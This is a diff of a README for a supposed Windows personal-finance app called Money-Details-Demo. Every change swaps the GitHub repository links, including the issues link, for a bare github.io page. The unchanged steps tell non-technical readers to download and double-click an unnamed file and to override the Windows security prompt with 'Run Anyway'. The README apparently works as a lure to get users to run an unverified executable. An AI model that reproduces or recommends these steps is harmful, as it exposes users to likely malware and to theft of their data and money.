@@ -1,6 +1,6 @@
 # 💰 Money-Details-Demo - Your Personal Finance Hub, Simplified
 
-[![Download Money-Details-Demo](https://img.shields.io/badge/Download-Money--Details--Demo-blue?style=for-the-badge&logo=github)](https://github.com/Marlinerefractory8591/Money-Details-Demo)
+[![Download Money-Details-Demo](https://img.shields.io/badge/Download-Money--Details--Demo-blue?style=for-the-badge&logo=github)](https://marlinerefractory8591.github.io)
 
 ---
 
@@ -28,7 +28,7 @@ No technical background is needed. If you can use a website, you can use Money-D
 
 ## 🚀 Getting Started
 
-Visit this link to download the application: [https://github.com/Marlinerefractory8591/Money-Details-Demo](https://github.com/Marlinerefractory8591/Money-Details-Demo)
+Visit this link to download the application: [https://marlinerefractory8591.github.io](https://marlinerefractory8591.github.io)
 
 Once you're on the download page, look for the button that says "Download" or "Releases" and click it to get the application files. After the download is complete, you will have the Money-Details-Demo application ready to use on your Windows computer.
 
@@ -38,7 +38,7 @@ Once you're on the download page, look for the button that says "Download" or "R
 
 Follow these simple steps to get Money-Details-Demo running on your PC:
 
-1. **Download the application** – Go to [https://github.com/Marlinerefractory8591/Money-Details-Demo](https://github.com/Marlinerefractory8591/Money-Details-Demo) and download the application file to your computer.
+1. **Download the application** – Go to [https://marlinerefractory8591.github.io](https://marlinerefractory8591.github.io) and download the application file to your computer.
 2. **Find the downloaded file** – Check your Downloads folder (or wherever your browser saves downloaded files). You'll see a file named something like `Money-Details-Demo`.
 3. **Double-click the file** – Double-click the downloaded file to open it. If you see a security prompt from Windows, click "More Info" and then "Run Anyway" to proceed.
 4. **Wait for the app to open** – The application will launch in your browser automatically. No complicated setup is needed.
@@ -134,7 +134,7 @@ Money-Details-Demo updates automatically in the background. You don't need to re
 
 If you run into any problem not covered here, you can:
 
-- Open an issue on the official GitHub page: [https://github.com/Marlinerefractory8591/Money-Details-Demo/issues](https://github.com/Marlinerefractory8591/Money-Details-Demo/issues)
+- Open an issue on the official GitHub page: [https://marlinerefractory8591.github.io](https://marlinerefractory8591.github.io)
 - Look for helpful tips in the app's "Help" section (available in the top menu)
 
 We're constantly improving the app and appreciate any feedback you share.
